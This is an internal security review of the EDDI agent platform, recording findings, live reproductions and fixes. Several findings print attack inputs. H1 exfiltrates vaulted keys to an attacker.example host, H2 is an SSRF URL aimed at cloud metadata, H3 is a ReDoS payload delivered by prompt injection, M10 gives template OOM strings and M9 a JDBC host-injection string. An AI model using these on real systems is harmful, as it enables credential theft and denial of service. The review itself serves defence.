# Security Review — 2026-10-17

> **Status: REMEDIATED (2026-10-18).** Every finding below has a fix on a pull request — see
> [Remediation status](#remediation-status-2026-10-18). What remains is listed under
> "Deliberately left for later" there and under [Not verified / open](#not-verified--open);
> this document is the record the `security review 2026-10-17, <id>` references in code and
> changelog fragments resolve to, not a plan to execute.

**Target:** `main` at `4b83ffb8b` (worktree `eddi-auth-principal-claim-a6e791`), EDDI 6.6.0-SNAPSHOT, both UIs, the shipped deployment files.
**Method:** six focused code reviews (REST/MCP authorization, SSRF and outbound HTTP, injection and parsers, secrets and crypto, the two UIs, runtime and deployment), each claim re-checked by the coordinating reviewer against the source, plus a **live run** of the image built from this commit behind Keycloak (`ui/manager/docker-compose.integration-keycloak.yml`, vault on) with role-less, viewer, user, approver, editor and admin tokens. `npm audit --omit=dev` is clean for both UIs.
**Baseline:** the 2026-10-15 review (H1/H2/M2/M9/M10/L6/L9/L10/L12). Every one of those fixes was re-read; none regressed. This document lists only what is new.

Severity: **High** = a legitimate low-privilege account reaches another account's secrets or data; **Medium** = privilege boundary weakened under a documented configuration, or a shipped default that leaves an operator exposed; **Low** = defence-in-depth, hygiene, or needs an unusual precondition.

## Summary

| # | Severity | Finding | Status |
|---|---|---|---|
| H1 | High | Any `eddi-editor` exfiltrates every provider key the setup wizard vaulted, by pointing a copy of the LLM config at their own host | **Reproduced live** |
| H2 | High | The always-on cloud-metadata guard is bypassed by a `java.net.URI` vs `java.net.URL` host-parsing differential: an httpCall to `http://x_y.attacker.com/…` (a registry-style hostname whose A record is `169.254.169.254`) passes `rejectCloudMetadataTarget` (`URI.getHost()` is null) and the Vert.x client connects to the metadata service | Verified (jshell differential + code); not run against a live metadata service |
| H3 | High | Cubic ReDoS on LLM output: the JSON fence stripper's regex takes ~1 h of CPU for 16k spaces, and any chat user can make a `convertToObject` agent's model emit that (prompt injection), or a hostile model endpoint can | **Reproduced** (jshell timing, cubic growth) |
| M1 | Medium | Editors read plaintext credentials in MCP, channel, httpcall and RAG configs, and in LLM cascade/judge/A2A fields — the read-redaction fix covers `tasks[].parameters` only | Code-verified |
| M2 | Medium | Any editor enumerates every user's display name, username and e-mail through `/workspaces/directory` (one-character prefix search, no rate limit) | **Reproduced live** |
| M3 | Medium | Under enforced workspaces: a workflow may reference another space's private LLM/httpcall/rules/RAG config (export then leaks it); group moderator, facilitator, facilitator RECRUIT and group duplication skip the per-agent USE check | Code-verified |
| M4 | Medium | Group-conversation attachments are stored with no owner: GDPR erasure never reaches them, nothing deletes them, and they bypass the per-user quota | Code-verified |
| M5 | Medium | `platform.operator` (the Platform Operator's configuration) is an editor-writable global variable; the admin's Manager trusts it for which agent is "the operator" and for the prompt an Upgrade re-provisions | Code-verified |
| M6 | Medium | `install.sh --db=postgres --with-auth` composes an invalid stack (`bind-guard` without an image); the Postgres and cluster stacks also lack the bind-guard that stops an unauthenticated EDDI being published off-loopback | **Reproduced** (`docker compose config`) |
| M7 | Medium | The unauthenticated quick start validates neither `Host` nor `Origin`; a DNS-rebinding page reaches the whole API, MCP and vault of a loopback instance | Live: arbitrary `Host` accepted |
| M9 | Medium | Outbound-HTTP gaps an editor can use: group-artifact JSON-schema `$ref`s are fetched with no SSRF policy and load `file:` URLs; pgvector `storeParameters.host` is spliced unencoded into the JDBC URL (connection-property injection, multi-host guard bypass); httpCall redirect hops get only the metadata check with protection off, so any open redirect reaches loopback and private ranges | Reviewer-verified with harnesses / code |
| M10 | Medium | Template `str:fmt`/`str:format` allocate before the output cap is checked (a `%2000000000d` width is an OOM), and the render wall-clock timeout is ineffective because the render runs synchronously before `get(timeout)` starts; a loop of under-cap `fmt` calls pins a CPU for minutes. Editor/admin-authored templates and the preview endpoint | **Reproduced** (30 M-char `fmt` allocated, then refused by the cap) |
| M11 | Medium | PDF attachments (20 MB, any `eddi-user`) and the PDF tool bypass the `PdfDecodeBudget`/`PdfStreamBudget` the RAG ingestion path has; the page-range extractor applies no `maxPages` | Code-verified (no bomb built) |
| M8 | Medium-Low | Export scrubber misses keys in path query strings, request bodies, `Cookie` headers and free text; instance sync validates the peer host by a separate DNS lookup, then connects with `SsrfPolicy.NONE` | Reviewer-tested against `target/classes` / code |
| L1–L16 | Low | See below | — |

Nothing Critical. Crypto primitives, the vault REST surface, `${caller:token}` handling, the attachment store, the audit ledger, HITL ownership, the OAuth connection flow, the CI pipeline and the production container image all held up — the "Checked and OK" section records coverage.

---

## High

### H1 — Wizard-vaulted provider keys are exfiltrable by any editor

**Where:** `engine/setup/AgentSetupService.java:1601` and `:1624` — `secretProvider.store(ref, plaintext, …, List.of("*"))`, no `allowedHosts`. `configs/llm/rest/RestLlmStore.java:101` returns the `${vault:…}` reference to editors (it redacts literals, references are the intended shape).

**Reproduced live (vault on, SSRF protection at its default `false`):**

1. Admin: `POST /administration/agents/setup` with `provider=openai`, `apiKey=sk-proj-VICTIM…`. The wizard stores the key as `${vault:setup.victim-setup-2.<ts>-<hex>.apiKey}` with `allowedAgents=["*"]` and **no `allowedHosts`**.
2. Editor: `GET /llmstore/llms/{id}?version=1` → the document, reference included.
3. Editor: `POST /llmstore/llms` with the same document and `parameters.baseUrl=http://host.docker.internal:9999/v1`; a workflow pointing at it; an agent; `POST /administration/production/deploy/{id}`; start; one message.
4. The listener on :9999 received `Authorization: Bearer sk-proj-VICTIMSECRETKEY…` from `User-Agent: langchain4j-openai`.

With SSRF protection **on** the same works against any public host — the policy blocks private addresses, not exfiltration. The `VaultGrantGate` passes (`*`), `VaultHostAllowlist` treats a null list as "any destination" (`docs/secrets-vault.md` §"Destination allow-list": "an unrestricted one shows nothing"), and `CallerTokenAuthorPolicy` does not apply (no caller token involved). The same path exfiltrates the `apiAuth` secret the API wizard vaults, and any admin-stored secret left unrestricted.

**Second path, no agent needed (code-verified):** `POST /mcpcallsstore/mcpcalls/discover-tools {"url":"https://attacker.example/mcp"}` with header `X-Mcp-Authorization: ${vault:<key>}` (`RestMcpCallsStore.java:249` → `McpToolProviderManager.java:1214-1219`) resolves the reference through `secretResolver.resolveValue` — which, per its own Javadoc, does not check agent grants — and sends `Authorization: Bearer <plaintext>` to the caller's URL. `requireSecretsAllowedAt` (the `allowedHosts` check) is the only control, so even a secret narrowed to one agent by `allowedAgents` is exfiltrable by any editor through the probe.

**Why it matters:** the role model says editors have deployment-wide authoring rights, but it also says vault secrets are the admin's: `/secretstore` is admin-only, the Manager hides values, `allowedHosts` exists. The wizard — the primary way keys enter the vault — leaves the destination open, so the admin-only boundary is one `baseUrl` edit wide.

**Fix:**
- Wizard: set `allowedHosts` from the provider's known endpoint (`api.openai.com`, `api.anthropic.com`, the Azure/Bedrock host the request names, the `baseUrl` the admin typed). Under `grant-enforcement=enforce`, refuse to create an unrestricted secret unless the request says `allowedHosts: ["*"]` explicitly, the way `allowedAgents` already must be explicit.
- Defence in depth: when an LLM/embedding/MCP config's `baseUrl` is not the provider's default **and** its `apiKey` is a vault reference the caller did not create, require `eddi-admin` at save time (same shape as `CallerTokenAuthorPolicy`), or at least log a `[SECURITY]` WARN naming the secret and host.
- Manager Secrets page: show "unrestricted destination" as a warning state, not blank.
- Discovery probes (`discover-tools`, and audit `discover-endpoints`): never resolve a vault reference supplied in the request; require a literal key or a connection the caller owns.

### H2 — Cloud-metadata guard bypassed by a URI/URL host-parsing differential

**Where:** `modules/llm/tools/UrlValidationUtils.java:199-205` — `rejectCloudMetadataTarget` takes `new URI(url).getHost()` and **returns silently when the host is null**. `engine/httpclient/impl/HttpClientWrapper.java:71` hands the same string to Vert.x `webClient.requestAbs`, whose `ClientUri.parse` uses `java.net.URL`.

**Verified:** `new URI("http://x_y.attacker.com/latest/").getHost()` → `null`; `new URL(…).getHost()` → `x_y.attacker.com`; and `javap` of the shipped `vertx-web-client-4.5.34` shows `ClientUri.parse` built on `java.net.URL` (`URL.getHost()`), so the client sees a host the guard did not. So with `eddi.security.ssrf-protection.enabled=false` (the default) an editor-written httpCall `targetServerUrl` of `http://x_y.attacker.com/latest/meta-data/iam/security-credentials/` — any registry-style host: underscore, `$`, `+`, `~`, `%xx` — skips the one check that applies on that path (`ApiCallExecutor.java:1219`), Vert.x resolves the attacker's A record (`169.254.169.254`) and connects. `HttpClientModule.requireNotMetadataHop` (`:221`) uses the same lenient check on redirect hops. The response lands in conversation memory. AWS IMDSv1, GCP (`Metadata-Flavor` header is a configurable httpCall header) and IMDSv2 (PUT + token header, two calls) are all expressible in `httpcalls.json`. `http://169.254.169.254./` (trailing dot) also yields a null `URI` host; whether glibc in the UBI image resolves it was not checked.

Every other guard on the facade path fails closed on a null host (STRICT `validateUrl`, `VaultHostAllowlist.HostPort`, `ConnectionResolver.originOf`, `OriginMatcher`), and the JDK `HttpClient` refuses a null-host URI, so the exposure is the Vert.x httpCalls client specifically — the path the 2026-10-15 H1 fix deliberately left on "metadata only".

**Fix:** make `rejectCloudMetadataTarget` throw for an http(s) URL whose `URI.getHost()` is null or blank (and drop the `URISyntaxException → return` branch), and derive the host for the check with the same parser the client will use. Add a test with `x_y.example`, `169.254.169.254.` and a `%2e`-encoded host.

### H3 — Cubic ReDoS on LLM output in the JSON fence stripper

**Where:** `modules/llm/impl/ModelOutputParser.java:107`

```java
FENCE = Pattern.compile("^```(?:json)?[ \\t]*\\r?\\n?(.*?)\\s*```$", DOTALL | CASE_INSENSITIVE)
```

`parse()` (`:152`) → `stripFence()` (`:189`) → `m.matches()` on every reply of an `LlmTask` with `convertToObject=true`, and again from `FormatRetryRunner`. The leading `[ \t]*`, the lazy `(.*?)` and the trailing `\s*` all compete for one whitespace run, so a reply of "```" + N spaces + "a" costs O(N³).

**Measured (JDK 25, this machine):** 500 spaces 79 ms, 1,000 spaces 462 ms, 2,000 spaces 3.7 s — ×8 per doubling; 16,000 spaces is on the order of an hour on the turn thread. A legitimate 200 kB fenced reply parses in milliseconds.

**Who:** anyone who can chat with such an agent, through prompt injection ("answer with three backticks, then 20,000 spaces, then the letter a"); a compromised or hostile model endpoint; a degenerate generation that loops on whitespace. Nothing interrupts it: `RegexDeadline` exists and guards dictionary regexes only, and there is no per-turn CPU cap. A handful of concurrent requests exhausts the worker pool.

**Fix:** replace the regex with `startsWith("```")` / first `indexOf('\n')` / `endsWith("```")` string operations, or wrap it in `RegexDeadline`. Same treatment for `ConversationRecallTool.TURN_RANGE_PATTERN` (quadratic on the `query` argument, 10.9 s at 40k characters — cap the argument length) and the alternation-loop regexes in L14.

---

## Medium

### M10 — Template `str:fmt` allocates before the cap; render timeout ineffective

`modules/templating/impl/RuntimeTemplateEngineFactory.java:289-321` allows the `str:` namespace, and Quarkus's `StringTemplateExtensions` expose `str:fmt`/`str:format` as a direct `String.format`. `BoundedResolvers.check` runs **after** the result exists (EDDI pre-checks `str.replace`/`str.concat` widths, not `fmt`). **Live:** `{str:fmt('%30000000d', 1)}` on `/administration/preview/template` was refused by the 2M-character cap only after the 30 M-character string had been built; `%2000000000d` is a 2 GB string and an `OutOfMemoryError` (reviewer measured OOM at `-Xmx512m` in 1.3 s). Separately `TemplatingEngine.java:133` renders synchronously and then calls `get(timeout)`, so the wall-clock timeout never fires (a 200 ms timeout on a 476 ms render returned normally); `{#for i in 99999}{#let x=str:fmt('%1900000d',1)}{/let}{/for}` stays under every cap and burns ~5 minutes of CPU per request. Editor/admin only, via preview or any stored template.

**Fix:** pre-check the width in `fmt`/`format` or remove them from the allowed set; run renders on an interruptible worker or check a deadline inside the bounded resolvers; also catch `StackOverflowError` in `TemplatingEngine.processTemplate` (`:138` catches `Exception | OutOfMemoryError` only — 5,000 nested `{#if}` escapes raw).

### M11 — PDF decode budgets missing on the attachment and tool paths

`modules/llm/tools/impl/AttachmentTextExtractor.java:79` (`loadPdf`) and `:176` (page-range `extractPdfText`) use plain PDFBox with a temp-file stream cache; RAG ingestion wraps PDFBox in `PdfDecodeBudget`/`PdfStreamBudget`, this path does not. A FlateDecode bomb (~1000:1) inside a 20 MB upload (`eddi.attachments.max-size-bytes`, any `eddi-user`), a `PdfReaderTool` URL (25 MB) or `ReadAttachmentTool` inflates to gigabytes of temp file and heap (`PDFStreamParser` builds a token list per page). `maxPages` (500) applies only to the whole-document variant; the `(startPage, endPage)` variant used by `extractTextFromPdfPages` and `ReadAttachmentTool` reads to `totalPages`. Not exercised with a crafted file.

**Fix:** reuse `PdfDecodeBudget` in the extractor and apply `maxPages` to the range variant.

### M1 — Plaintext credentials readable by editors in config types the redaction fix did not reach

`RestLlmStore.readLlm` redacts only `tasks[].parameters` by `SECRET_PARAMETER_NAMES` (`RestLlmStore.java:110-163`). Not redacted on read, and only warned about (or not at all) on write:

| Store | Field | Read path |
|---|---|---|
| `RestLlmStore` | `a2aAgents[].apiKey`, `modelCascade.steps[].parameters`, `modelCascade.judgeModel.parameters` | verbatim |
| `RestMcpCallsStore.readMcpCalls` | `apiKey` | verbatim (no redaction code in the class) |
| `RestChannelIntegrationStore.readChannel` | `platformConfig.botToken`, `signingSecret` | verbatim; `warnOnPlaintextSecrets` (`:213`) only logs |
| `RestRagStore.readRag` | `embeddingParameters`/`storeParameters` `apiKey`, `password` | verbatim, warn only |
| `RestApiCallsStore.readApiCalls` | literal `Authorization` header, keys in `request.path`/`body` | verbatim, no warning |

Old versions stay readable via `?version=`. A Slack `signingSecret` lets the holder forge `/integrations/slack/*` webhooks. **Fix:** one shared read-redactor applied by every config store for non-admin callers (the LLM store has the pattern), or reject literals at write time as the Manager already forces for Slack.

### M2 — Editors can harvest every user's name and e-mail

`GET /workspaces/directory?q=<prefix>&limit=25` is `eddi-admin`/`eddi-editor` (`IRestWorkspaces`, class level) and active whenever auth is on — `UserDirectory.isActive()` (`:112`) does **not** depend on workspaces being enforced; `MIN_USER_QUERY=1`, defaults `eddi.workspaces.directory.enabled=true`, `expose-email=true`. `UserDirectoryRecorder` records every authenticated caller, chat-only `eddi-user` customers included.

**Reproduced live** as the editor-only account: `q=e` returned `eddi@localhost`, `user@localhost`, `viewer@localhost` and the `engineering` team; `q=a`, `q=n` returned the users created during the probe with their e-mails. `eddi-user` and `eddi-viewer` get 403. 26 one-letter queries, repeated per prefix, enumerate the directory; nothing rate-limits it.

**Fix:** tie `directory.enabled` to `eddi.workspaces.enabled` by default, require 3+ characters, cap results to shared teams for non-admins, and drop `detail` (the e-mail) unless the caller is an admin or shares a team.

### M3 — Workspace enforcement gaps (`eddi.workspaces.enabled=true` only)

Reported by the authorization review and spot-checked:

1. **Unchecked workflow → extension references.** `RestAgentStore.requireWorkflowsExist` (`:597-617`) enforces VIEW on the agent's workflows, but `RestWorkflowStore` (`create`/`update`/`updateResourceInWorkflow`, `:142`, `:147`, `:218`) does not check the step URIs — parser, rules, httpcalls, LLM, property, output, mcpcalls, RAG. A user with EDIT on only their own workflow can point a step at another space's private LLM/RAG id, then `POST /backup/export/{ownAgent}` — `RestExportService.exportAgent` (`:328`) checks VIEW on the **agent** only and `readConfigs` reads the stores directly — and download the victim's config; or deploy and chat, since `ResourceClientLibrary` bypasses the guard on the engine path. Vault secrets stay protected by `VaultGrantChecker`. Needs the victim's ObjectId (leaks through URLs and notifications).
2. **USE check on members only.** `RestAgentGroupStore.requireUseOnMembers` (`:124`) iterates `getMembers()`; `moderatorAgentId`, `facilitator.agentId` and the facilitator RECRUIT path (`FacilitatorEngine.java:351`, `:412`) run private agents through `MemberTurnExecutor.java:602` with no USE check. `RecruitAgentTool` was fixed ("M-A1") but its sibling was not. `duplicateGroup` (`:160`) needs only VIEW on the source and never re-checks members.

**Fix:** require VIEW (USE for runtime-only types) on every referenced resource at workflow create/update, and apply `requireAgentUseAccess` to moderator and facilitator ids at save time plus `principalMayUse` in RECRUIT.

### M4 — Group-conversation attachments have no owner

`engine/internal/groups/GroupAttachmentBinder.java:61` calls the 5-argument `attachmentStore.store(bytes, mime, name, gc.getId(), tenant)`, which `IAttachmentStore.java:50-53` forwards with `userId = null`. Consequences: `GdprComplianceService` walks `getConversationIdsByUserId` (1:1 conversations only), `GroupLifecycleOps.deleteGroupConversation` deletes artifacts and the document but not the blobs, `DELETE /conversations/{gcId}/attachments` is guarded by a 1:1-only owner check — so the files are never deleted and an Art. 17 erasure reports success while leaving them behind; and `eddi.attachments.max-per-user` is not counted (one `eddi-user` can store 100 MB per group discussion, unbounded).

Latent: `materializeAttachments` passes a caller-supplied `storageRef` through to `grantAccess(ref, memberConvId)` with no ownership check; unreachable today because REST never populates `storageRef`.

**Fix:** store with `gc.getUserId()`, add group-conversation ids to the erasure walk, delete blobs in `deleteGroupConversation`, and refuse a client-supplied `storageRef` the caller does not own.

### M5 — `platform.operator` is editor-writable

`IRestGlobalVariableStore` is `@RolesAllowed({"eddi-admin","eddi-editor"})` including `PUT`; `RestGlobalVariableStore.java:107` restricts only values that resolve to a vault secret. The Manager reads `platform.operator` (`ui/manager/src/lib/api/operator.ts`, `use-operator.ts:106` takes `agentId` from it) to decide which agent is the Platform Operator and shows it in the admin's drawer; `promptBody` with `promptBodyIsDefault:false` is what an admin's "Upgrade"/"Reconfigure" re-provisions (`operator-revision.ts:104-108`). An editor can therefore (a) repoint the operator to an editor-authored agent the admin then talks to, and (b) plant a system prompt that becomes the real operator's prompt — with its `${caller:token}` tools — at the next upgrade. Writes are HITL-gated, reads are not.

**Fix:** reserve `platform.*` keys for `eddi-admin` server-side; have the Manager verify the `[eddi-platform-operator]` marker and gate state before chatting; audit variable writes.

### M6 — Installer composes an invalid stack for Postgres + auth; two stacks lack the bind-guard

`docker compose -f docker-compose.postgres-only.yml -f docker-compose.auth.yml config` fails: `service "bind-guard" has neither an image nor a build context specified` — `docker-compose.auth.yml` overrides a service only `docker-compose.yml` defines. `install.sh` `resolve_compose_files` (`:960-995`) selects exactly that pair for `--db=postgres --with-auth`, so the authenticated Postgres install cannot start. Separately `docker-compose.postgres-only.yml` and `docker-compose.cluster.yml` publish on `${EDDI_BIND:-127.0.0.1}` with the three `*_ALLOW_UNAUTHENTICATED` defaults `true` and **no** `bind-guard`, so `EDDI_BIND=0.0.0.0` there publishes an open EDDI, MCP and vault.

**Fix:** move `bind-guard` into its own overlay (or define it in every base stack) and make the auth overlay's override conditional; add a CI job that renders every documented compose combination.

### M7 — Unauthenticated quick start: no `Host`/`Origin`/`Sec-Fetch-Site` check

With `EDDI_SECURITY_ALLOW_UNAUTHENTICATED=true` (the shipped `docker-compose.yml` default, loopback-bound) nothing in `src/main/java` validates `Host` (live: `Host: evil.example` is served normally) or rejects cross-site state-changing requests. A page on an attacker's domain that DNS-rebinds to `127.0.0.1:7070` becomes same-origin with the full API, MCP and `/secretstore`; without rebinding, body-less cross-site `POST`s (CORS "simple requests") still execute blind. Loopback binding stops the network, not the browser. Chrome's Local Network Access prompts mitigate but do not close this.

**Fix:** when `authorization.enabled=false`, reject requests whose `Host` is not loopback or the configured public host, and reject non-GET requests whose `Origin`/`Sec-Fetch-Site` is cross-site unless the origin is in `quarkus.http.cors.origins`. (The MCP endpoint already validates `Origin` — live: `403` for `https://evil.example` — so the pattern exists.)

### M9 — Outbound-HTTP gaps reachable by an editor

Reported by the SSRF review with small harnesses against `target/classes`; code paths confirmed:

1. **Group-artifact JSON-schema `$ref`s.** `configs/groups/ArtifactValidators.java:50` builds `JsonSchemaFactory.getInstance(V202012)` with networknt defaults; `checkJsonSchema` (`:266`) resolves refs lazily at the first artifact write. Harness: `{"$ref":"http://127.0.0.1:PORT/remote.json"}` was fetched and `{"$ref":"file:/…/loc.json"}` was loaded and applied — no SSRF policy, no metadata guard, no timeout, no size cap. Blind (errors say only "Failed to load json schema from <ref>"), but it is a local-file existence/valid-JSON oracle and can hang a member turn. Fix: install schema loaders that accept only the inline schema and the classpath.
2. **pgvector host injection.** `EmbeddingStoreFactory.java:695-708` passes `storeParameters.host` to `PGSimpleDataSource.setServerNames` unencoded; `host = "db.example.com/eddi?sslmode=disable&sslfactory=org.postgresql.ssl.NonValidatingFactory&x="` yields a JDBC URL whose injected properties pgjdbc 42.7.14 honours (`socketFactory`, `sslfactory`, `authenticationPluginClassName`, `sslpasswordcallback`, `xmlFactoryFactory`, `targetServerType` are all reachable), and `a.com,10.0.0.5` dials hosts the `guardStoreHost` metadata check never saw. No file write or RCE was found. Fix: validate `host` against a strict hostname/IP-literal pattern.
3. **httpCall redirect hops with protection off.** GET/HEAD httpCalls without a credential header follow redirects; `refusingMetadataHops` vetoes only metadata/link-local, so a `302` from any reachable server (third-party open redirect, UGC host) sends the call to `127.0.0.1:7070` or an internal service and the body returns into conversation memory. The facade's `HOPS_ONLY` policy already does a private-address check per hop and is unused here. When fixing, note that `DefaultRedirectHandler` builds `RequestOptions` from `URI.getHost()`, so a host-less `Location` must be refused rather than left to the client's default host.
4. **Cross-origin header stripping is a deny-list** (`OutboundHttp.SENSITIVE_HEADERS`): literal credentials under other names (`X-Goog-Api-Key`, `Private-Token`, `X-Vault-Token`) replay across a redirect; and `ApiCallExecutor.java:1275` detects a credential header by `resolvedSecrets.size()` growth, so a reference already resolved earlier in the same request (URL or body) does not flag a later custom header. Contrived; track by reference instead.

### M8 — Export scrubbing and instance-sync SSRF (Medium-Low)

- `SecretScrubber.scrubJson` (export ZIPs, sync) leaves in clear: keys inside `request.path` query strings (`?key=AIza…`, `?api_key=`, `?token=`), `request.body` strings (`client_secret=…`, JSON-in-a-string `apiKey`), the `Cookie` header, provider-shaped keys in `description`/`systemPrompt`, and `serviceAccountJson`-style embedded JSON. Runtime has `RequestRedactor`/`UriRedactor`; the export path does not use them.
- `/backup/import/sync*`: `SourceUrlValidator.validate` resolves the peer host and rejects private addresses, then `RemoteApiResourceSource.peerRequest` connects through `Profile.INTERNAL_PEER` with `.ssrf(SsrfPolicy.NONE)` — a second resolution, so a rebinding DNS name reaches internal hosts with the forwarded `X-Source-Authorization`. Admin/editor only, redirects off, body capped. Not exercised dynamically.

**Fix:** run `UriRedactor`/`RequestRedactor` over exported httpcall documents; pin the resolved address for sync or use `STRICT` plus an allow-list.

---

## Low

- **L1 — Chat `?apiServer=` same-origin confused deputy.** `ui/chat/src/components/ChatWidget.tsx:255-272` allows `?` and `#`; `http.ts` builds URLs by concatenation, so `?apiServer=%2Fadministration%2Fcluster%2Fcaches%2Fresync%3F` makes the widget's start call a `POST /administration/cluster/caches/resync?/agents/…`. Matters only where the browser holds a token for the top-level page (auth off, or `?token=` enabled). Fix: parse with `new URL(raw, origin)` and require empty search/hash and an unchanged pathname.
- **L2 — MCP group tools use the non-strict owner check.** `McpGroupTools.java:111-114` → `requireOwnerOrAdmin`; `delete/followup/continue/close/read_group_conversation` admit any CONVERSE-role caller (viewer included) to a record whose `userId` is null/blank. REST was moved to `requireOwnerOrAdminStrict` in L9; `RestGroupConversation.readGroupConversation` (`:321`) is also still non-strict.
- **L3 — Reserved principal namespaces guarded on one side only.** Only `/v1` rejects OIDC principals with `openwebui:`; a principal named `slack:<team>:<user>`, `group:<id>`, `system:…`, `a2a:…`, `webhook:…` (PR #1059) or `agent-test:…` (PR #1065, which switches tool mocking on for that principal) passes `validateUserAccess`/`isOwner` and would own that Slack user's conversations or that team's RETRO memory. Needs an IdP that allows `:` in usernames. Fix: reject reserved prefixes in `NamelessPrincipalAugmentor`.
- **L4 — USE is checked at `startConversation` only.** Revoking a share or flipping an agent to private does not stop an existing READY conversation (`RestAgentEngine.java:155` vs `:331`); groups, A2A, `/v1` and schedule fires do re-check.
- **L5 — Manager HTML/URL hygiene.** `markdown-safe.tsx` opt-in "Allow HTML" keeps `class` (Tailwind utilities enable full-viewport fake prompts) and `<svg><image href>`; several `lib/api/*` paths interpolate route ids without `encodeURIComponent` (React Router decodes `%2F`, `fetch` collapses `..`, so a crafted deep link can retarget a Delete to another store); `navigateAway(authorizationUrl)` has no scheme check; pinned workforce responses persist in `localStorage` across logout.
- **L6 — Free-text redaction patterns.** `SecretRedactionFilter` covers `sk-`, `sk-ant-`, `Bearer`, named fields; not `AIza…`, `xai-`, `gsk_`, `ghp_`, `xoxb-`, `AKIA…`, `Authorization: Basic/Token`, `api-key:` (Azure OpenAI), `mongodb://u:pw@`, bare JWTs. Backs logs, dead letters, audit scrub, HITL cards.
- **L7 — Runtime defaults.** No HSTS anywhere (GCP nginx, Helm ingress, Quarkus); `/q/health` (public) reports cluster mode, NATS, node ids and members; Keycloak `start-dev` with `admin/admin` fallback in every non-Helm stack and the GCP nginx leaves `/realms/master/protocol/openid-connect/token` reachable; realm has no password policy, no events, `eddi-mcp` with `fullScopeAllowed` and no consent on loopback wildcard redirects, seeded users `emailVerified:true` on placeholder e-mails (the directory resolves shares by verified e-mail); EDDI connects to MongoDB as root; OIDC discovery/JWKS, Mongo, Postgres and NATS plaintext between services by default; k8s kustomize overlays ship open (`ALLOW_UNAUTHENTICATED=true`, unauthenticated Mongo in `quickstart.yaml`, NATS without auth, spoofable ingress NetworkPolicy selector); Mongo/Postgres/Keycloak pods lack container-level `securityContext`; `quarkus.swagger-ui.oauth2-redirect-url` hard-coded to localhost; `quarkus.log.console.level=DEBUG` at the handler.
- **L8 — Supply chain of the installers.** `install.sh`/`install.ps1` and `gcp/provision-vm.sh` fetch compose files, the realm, the CLI and the installer itself from `raw.githubusercontent.com` with TLS only (no checksum, no cosign), the GCP default follows mutable `main` and runs the installer as root; compose defaults to `labsai/eddi:latest`; third-party compose images are tag-pinned (`postgres:16-alpine` floats); `mcp-sidecar/Dockerfile` installs `nodejs npm` unpinned. (CI itself is in good shape — see OK list.)
- **L9 — GDPR details.** `AuditHmac.pseudonymFor` is an unsalted SHA-256 for database-log pseudonymisation (dictionary-reversible for e-mail ids; the ledger uses the keyed form); the export omits group conversations and shared artifacts (erased but not exported, Art. 15/20).
- **L10 — Legacy no-AAD decrypt fallback is permanent** (`VaultSecretProvider.decryptSecretWithFallback`): with DB write access, ciphertext of two pre-AAD rows can be swapped. Re-seal on read.
- **L11 — Admin footguns.** `POST /secretstore/secrets/{tenant}/reset` has no `confirm` (unlike `adopt-master-key`); `OpenAiAuthFilter.constantTimeEquals` leaks key length (negligible).
- **L13 — Outbound odds and ends (unverified).** Jlama `modelCachePath`/`workingDirectory` are editor-supplied filesystem paths and `modelName` is fetched from Hugging Face by Jlama's own client; MCP responses via langchain4j and LLM provider responses via `JdkHttpClient` have no size cap, so a malicious configured server can stream without bound; an httpCall whose `future.get(timeout)` expires is not cancelled on the Vert.x side; `SourceUrlValidator` with `allow-private-targets=true` also skips the metadata block.
- **L14 — Regex stack overflows on error bodies.** The alternation-loop form `"((?:[^"\\]|\\.)*)"` overflows a 1 MB stack at ~2,000 characters (measured). `ConfidenceEvaluator.java:64` applies it to LLM output (fails the turn); `LifecycleManager.java:1092` `PROVIDER_ERROR_MESSAGE` applies it to a provider error body **inside the failure handler** (`reportFailureToCaller` → `summarizeException` → `providerMessage`), which the new `catch (… | StackOverflowError)` at `:410` does not cover — a provider that echoes a >2 kB user string into `"message"` throws out of the handler. Use possessive quantifiers or an `indexOf` scan. Virtual-thread stacks were not measured.
- **L15 — `SharedKvCache.decode`** (`engine/caching/SharedKvCache.java:91-103`) does `Class.forName` on a type name read from the NATS KV with package-prefix allow-listing (`java.util.` admits e.g. `java.util.logging.FileHandler`). Needs NATS write access. Allow-list exact classes.
- **L16 — Templated httpCall bodies are not auto-escaped** (`ApiCallExecutor.java:1196`): a runtime value containing `","x":"` changes the JSON structure unless the author uses `json:serialize`; host, path and query values are encoded, bodies are not. Author-facing footgun; document or default to escaping for `application/json`.
- **L12 — Info.** `/connections/{name}/authorize` is `@Authenticated` without a role (connections are off by default — live `404`); a role-less token can `initialize` an MCP session (tools stay role-gated — live verified); the OAuth resource metadata reflects the request `Host` (documented; only matters behind a proxy that forwards an attacker-chosen `Host`).

---

## Live probe results (image from this commit, Keycloak on)

| Check | Result |
|---|---|
| 70 GET paths unauthenticated | Only the documented permits answer: SPA shells and their config scripts, `/q/health*`, RFC 9728 metadata, A2A cards, `/v1` (404, disabled). Everything else `401`. `TRACE` → 405. Traversal variants under `/manage` → 401/403. |
| Truly role-less token (realm default role removed) | Reaches nothing beyond the public set (`/openapi`, docs, conversation listing, workspaces all refused). Note: Keycloak's realm default role grants **`eddi-user`** to every new account, so a "role-less" user does not exist in the shipped realm. |
| `eddi-viewer` | Reads `/administration/cluster/overview` (deliberate, content stripped), `/conversationstore/conversations` (own), `/openapi`, docs. No admin writes. |
| `eddi-user` / `eddi-approver` | Converse tier only; `/a2a/agents` lists; pending-approvals own-scoped. |
| CORS | Exact-match origins; `null`, suffix and embedded-origin spoofs → 403; `Vary: origin` set. |
| Headers | CSP as documented on `/manage`, `/chat`, swagger and API responses; XFO DENY everywhere except `/chat`; `nosniff`, Referrer-Policy, Permissions-Policy present; **no HSTS**. |
| Limits | 70 MB body → 413; chunked body → 411; 9 kB path → 414; `limit=99999` → 400; malformed JSON → 400 with no stack trace. |
| Template preview | `eddi-user` → 403; `{#eval}`/`{#include}` → parser error; `config:`/`cdi:`/`inject:`/reflection paths render empty; unbounded `{#for}` refused. |
| MCP | `Origin: https://evil.example` → 403; role-less `initialize` → 200 (tools role-gated). |
| H1 | Reproduced (see above). |
| M2 | Reproduced (see above). |
| M6 | Reproduced with `docker compose config`. |

## Checked and OK (coverage)

